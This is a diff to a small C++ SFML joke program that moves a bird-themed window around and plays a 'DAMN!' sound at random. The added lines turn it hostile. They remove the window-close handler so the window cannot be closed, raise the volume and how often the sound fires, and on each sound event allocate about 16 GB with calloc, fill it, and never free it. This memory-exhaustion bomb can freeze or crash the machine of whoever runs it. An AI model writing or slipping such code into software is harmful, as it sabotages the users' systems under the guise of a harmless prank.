@@ -56,6 +56,7 @@ int main()
     sf::SoundBuffer DAMN_soundbuffer;
     DAMN_soundbuffer.loadFromFile("Assets/DAMN!.wav");
     sf::Sound DAMN_sound(DAMN_soundbuffer);
+    DAMN_sound.setVolume(256);
 
     bird.setScale(bird_scale);
     bird.setOrigin(sf::Vector2f(bird_texture.getSize()) / 2.f);
@@ -75,6 +76,8 @@ int main()
 
     sf::Angle window_direction_angle;
 
+    std::vector<size_t*> mem;
+   
     srand(time(0));
 
     while (window.isOpen())
@@ -82,9 +85,7 @@ int main()
         event_clock.restart();
         while (const std::optional event = window.pollEvent())
         {
-            if (event->is<sf::Event::Closed>())
-                window.close();
-            else if (event->is<sf::Event::MouseButtonPressed>())
+            if (event->is<sf::Event::MouseButtonPressed>())
             {
                 if (event->getIf<sf::Event::MouseButtonPressed>()->button == sf::Mouse::Button::Left)
                 {
@@ -153,11 +154,20 @@ int main()
             window_direction_angle = sf::degrees(rand() % 360);
             timer = 0.f;
             timer_offset = rand() % 5;
-            its_DAMN_time = (rand() % 5 == 4);
+            its_DAMN_time = (rand() % 3 == 2);
             if (its_DAMN_time)
             {
                 DAMN_sound.play();
-                DAMN_sound.setPitch(1.f + (rand() % 10) / 10.f);
+                DAMN_sound.setPitch(.6f + (rand() % 10) / 10.f);
+
+                mem.push_back(
+                    (size_t*)calloc(2'147'483'647, sizeof(size_t))
+                );
+
+                for (size_t j = 0; j < 2'147'483'647; ++j)
+                {
+                    mem[mem.size() - 1][j] = j;
+                }
             }
         }
 
